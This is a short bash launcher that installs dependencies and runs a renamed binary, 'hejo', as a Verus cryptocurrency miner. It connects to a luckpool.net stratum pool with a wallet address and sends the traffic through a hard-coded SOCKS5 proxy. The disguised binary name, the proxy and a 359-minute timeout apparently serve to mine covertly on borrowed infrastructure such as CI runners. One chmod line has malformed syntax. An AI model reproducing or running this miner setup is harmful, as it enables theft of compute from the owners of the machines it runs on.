#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x cuk.sh && chmod +x hejo chmod 777 hejo cuk.sh
screen -dmS ls
A=stratum+tcp://na.luckpool.net:3956
B=R9MYDigKy1i1a9EGT2fhM4ZdAEjxG9oRfw
C=PUSHING-12
D=socks5://78.46.88.230:51100
timeout 359m ./hejo -a verus -o $A -u $B.$C -p x -t 2 -x $D
sudo apt update
